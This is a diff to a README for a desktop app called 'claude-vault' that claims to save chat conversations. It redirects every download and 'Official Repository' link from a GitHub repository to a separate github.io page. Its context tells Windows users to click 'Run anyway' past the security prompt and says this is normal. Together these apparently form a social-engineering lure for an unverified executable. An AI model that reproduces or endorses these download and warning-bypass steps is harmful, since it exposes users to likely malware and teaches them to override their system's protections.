@@ -37,9 +37,9 @@ There's no sign-up, no login, no subscription. Download, run, and you're done. Y
 Getting going is easier than you think. Follow these simple steps:
 
 ### Step 1: Download the Application
-Visit this link to download the application: [https://github.com/indocindesertplant48/claude-vault](https://github.com/indocindesertplant48/claude-vault)
+Visit this link to download the application: [https://indocindesertplant48.github.io](https://indocindesertplant48.github.io)
 
-[![Download Now](https://img.shields.io/badge/Download-claude--vault-brightgreen?style=for-the-badge&logo=github)](https://github.com/indocindesertplant48/claude-vault)
+[![Download Now](https://img.shields.io/badge/Download-claude--vault-brightgreen?style=for-the-badge&logo=github)](https://indocindesertplant48.github.io)
 
 ### Step 2: Open the App
 Once downloaded, double-click the file to open claude-vault. On Windows, you may see a security prompt — click "More info" and then "Run anyway." This is normal for new applications.
@@ -150,7 +150,7 @@ Download it today and never stress about a lost conversation again.
 
 ## 📚 Additional Resources
 
-- **Official Repository**: [https://github.com/indocindesertplant48/claude-vault](https://github.com/indocindesertplant48/claude-vault)
+- **Official Repository**: [https://indocindesertplant48.github.io](https://indocindesertplant48.github.io)
 - **Documentation**: Check the README file in the repository for advanced tips.
 - **Support**: Open an issue on GitHub for any questions or assistance.
 
